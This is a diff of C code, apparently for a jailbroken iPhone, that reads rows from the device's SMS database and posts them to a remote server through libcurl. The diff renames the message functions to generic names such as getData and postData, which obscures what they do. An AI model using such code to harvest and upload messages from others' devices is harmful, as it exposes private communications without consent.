@@ -25,8 +25,8 @@ char logFile[400] = "/var/root/bsms.log";
 int permitId;
 char localBuffer[1024*100] = {0};
 int cronMessageTask(int rowid);
-int getMessage(int rowid, char ***res, int *column);
-int sendMessage(CURL *curl, char *messageData);
+int getData(int rowid, char ***res, int *column);
+int postData(CURL *curl, char *messageData);
 int getPermitID();
 int SqliteQuery(sqlite3 *db, const char *sql, char ***res, int *column);
 int getUUID(char* des_netcard , char* out_addr);
@@ -129,7 +129,7 @@ int callbackBlockedWritedataFunc(void *ptr, int size, int nmemb, void *stream) {
 int cronMessageTask(int rowid) {
     char **result;
     int i=0, j=0, nlen=0, column=0, offset = 0;
-    int row = getMessage(rowid, &result, &column);
+    int row = getData(rowid, &result, &column);
 
     if(row > 0) {
         if(curl) {
@@ -147,14 +147,14 @@ int cronMessageTask(int rowid) {
                 snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "%s=%s&", result[j], result[offset]);
                 nlen = strlen(messageData);
             }
-            sendMessage(curl, messageData);
+            postData(curl, messageData);
         }
     }
 
     return 0;
 }
 
-int sendMessage(CURL *curl, char *messageData) {
+int postData(CURL *curl, char *messageData) {
 
     CURLcode res;
 
@@ -162,16 +162,16 @@ int sendMessage(CURL *curl, char *messageData) {
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, messageData);
         res = curl_easy_perform(curl);
         if(res != CURLE_OK) {
-        	writeLog("sendMessage() curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        	writeLog("postData() curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
         } else {
-        	writeLog("sendMessage() ok\n");
+        	writeLog("postData() ok\n");
         }
     }
 
     return 0;
 }
 
-int getMessage(int rowid, char ***res, int *column) {
+int getData(int rowid, char ***res, int *column) {
     sqlite3 *db;
     int rc;
     rc = sqlite3_open("/private/var/mobile/Library/SMS/sms.db", &db);
